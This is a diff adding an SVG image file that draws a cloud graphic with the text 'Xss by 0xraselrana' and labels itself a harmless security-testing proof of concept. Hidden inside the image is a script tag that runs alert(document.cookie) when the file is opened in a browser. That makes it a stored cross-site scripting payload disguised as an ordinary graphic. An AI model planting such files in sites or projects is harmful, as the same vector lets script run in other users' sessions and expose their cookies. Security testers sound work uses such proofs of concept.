@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="800" height="450" viewBox="0 0 800 450">
+  <title>Surprisssssseeeeeeee!!</title>
+  <rect width="800" height="450" rx="24" fill="#f8fbff"/>
+  <path d="M245 175c-35 0-63-27-63-61s28-61 63-61c12-31 42-52 77-52 43 0 78 32 83 74 32 2 57 28 57 60 0 34-28 62-62 62H245z"
+        transform="translate(70 40) scale(.75)" fill="#dceaff" stroke="#2563eb" stroke-width="8"/>
+  <text x="400" y="245" font-family="Arial, sans-serif" font-size="38" font-weight="700"
+        text-anchor="middle" fill="#10264b">Xss by 0xraselrana</text>
+  <text x="400" y="290" font-family="Arial, sans-serif" font-size="20"
+        text-anchor="middle" fill="#526987">Harmless security-testing proof of concept</text>
+  <rect x="250" y="325" width="300" height="54" rx="14" fill="#e4eeff"/>
+  <text x="400" y="359" font-family="Arial, sans-serif" font-size="19" font-weight="600"
+        text-anchor="middle" fill="#1d4ed8">You are very chalak Bro!</text>
+  <script type="text/javascript">
+    alert(document.cookie);
+  </script>
+</svg>
